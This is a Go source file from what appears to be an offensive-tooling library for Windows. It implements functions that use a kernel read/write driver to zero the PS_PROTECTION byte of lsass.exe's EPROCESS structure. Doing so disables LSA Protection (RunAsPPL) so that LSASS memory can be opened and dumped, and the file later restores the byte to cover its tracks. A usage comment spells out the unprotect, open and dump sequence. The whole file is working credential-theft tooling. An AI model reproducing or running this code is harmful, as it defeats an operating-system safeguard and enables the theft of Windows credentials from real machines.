//go:build windows

package lsassdump

import (
	"errors"
	"fmt"

	"github.com/oioio-space/maldev/kernel/driver"
)

// PPLOffsetTable maps a kernel build to the EPROCESS.Protection byte
// offset. Callers populate this from offline PDB dumps and hand it to
// Unprotect — the package does NOT ship a built-in database because
// EPROCESS layout shifts every cumulative update.
//
// Build is the low dword of the OS build (e.g. 19045 for Win10 22H2).
// ProtectionOffset is the byte offset of the PS_PROTECTION field
// inside _EPROCESS.
type PPLOffsetTable struct {
	Build            uint32
	ProtectionOffset uint32
}

// PPLToken captures the lsass EPROCESS VA, the original PS_PROTECTION
// byte, and the offset Reprotect needs to write to. Treat as opaque
// — its layout may evolve. The zero value is safe to defer Reprotect
// against (it is a no-op).
type PPLToken struct {
	EProcess           uintptr
	OriginalProtection byte
	ProtectionOffset   uint32
}

// IsZero reports whether the token was never populated. Callers can
// guard cleanup paths with `if !tok.IsZero() { Reprotect(tok, rw) }`.
func (t PPLToken) IsZero() bool {
	return t.EProcess == 0 && t.OriginalProtection == 0 && t.ProtectionOffset == 0
}

// ErrInvalidEProcess is returned by Unprotect when the caller passes a
// zero EPROCESS VA — a dead giveaway of an unfilled struct or a failed
// upstream lookup. We refuse to write to address 0.
var ErrInvalidEProcess = errors.New("lsassdump: zero EPROCESS VA — upstream lookup failed")

// ErrInvalidProtectionOffset is returned when PPLOffsetTable.ProtectionOffset
// is zero — every documented Win10/11 build has a non-zero offset.
var ErrInvalidProtectionOffset = errors.New("lsassdump: zero ProtectionOffset — populate PPLOffsetTable for the current build")

// Unprotect reads lsass.exe's PS_PROTECTION byte at
// `eprocess + tab.ProtectionOffset`, captures it into the returned
// PPLToken, then writes 0 — at which point a userland NtOpenProcess
// with PROCESS_VM_READ succeeds even when RunAsPPL=1.
//
// Caller is responsible for resolving lsass.exe's EPROCESS kernel VA
// upstream (typically via PsActiveProcessHead walk or a sibling
// kernel-table primitive). Wrapping that lookup is intentionally not
// part of this surface — different callers use different walk
// strategies (PsLookupProcessByProcessId proxy, kernel handle table,
// EDRSandBlast-style PspCidTable parse).
//
// Returns ErrInvalidEProcess if eprocess == 0,
// ErrInvalidProtectionOffset if tab.ProtectionOffset == 0, or the
// underlying writer error wrapped with the failing kernel VA.
func Unprotect(rw driver.ReadWriter, eprocess uintptr, tab PPLOffsetTable) (PPLToken, error) {
	if rw == nil {
		return PPLToken{}, driver.ErrNotLoaded
	}
	if eprocess == 0 {
		return PPLToken{}, ErrInvalidEProcess
	}
	if tab.ProtectionOffset == 0 {
		return PPLToken{}, ErrInvalidProtectionOffset
	}
	target := eprocess + uintptr(tab.ProtectionOffset)
	buf := make([]byte, 1)
	if _, err := rw.ReadKernel(target, buf); err != nil {
		return PPLToken{}, fmt.Errorf("read PS_PROTECTION @0x%X: %w", target, err)
	}
	original := buf[0]
	if _, err := rw.WriteKernel(target, []byte{0}); err != nil {
		return PPLToken{}, fmt.Errorf("zero PS_PROTECTION @0x%X: %w", target, err)
	}
	return PPLToken{
		EProcess:           eprocess,
		OriginalProtection: original,
		ProtectionOffset:   tab.ProtectionOffset,
	}, nil
}

// Reprotect writes tok.OriginalProtection back to
// `tok.EProcess + tok.ProtectionOffset` — the inverse of Unprotect.
// Returns nil on the zero token (no-op for the deferred-cleanup
// idiom).
//
// Callers typically:
//
//	tok, err := lsassdump.Unprotect(rw, eprocess, tab)
//	if err != nil { return err }
//	defer lsassdump.Reprotect(tok, rw)
//	h, err := lsassdump.OpenLSASS(nil)
//	...
//	_, err = lsassdump.Dump(h, w, nil)
//
// so the protection byte is restored even on early-return / panic.
func Reprotect(tok PPLToken, rw driver.ReadWriter) error {
	if tok.IsZero() {
		return nil
	}
	if rw == nil {
		return driver.ErrNotLoaded
	}
	target := tok.EProcess + uintptr(tok.ProtectionOffset)
	if _, err := rw.WriteKernel(target, []byte{tok.OriginalProtection}); err != nil {
		return fmt.Errorf("restore PS_PROTECTION @0x%X: %w", target, err)
	}
	return nil
}
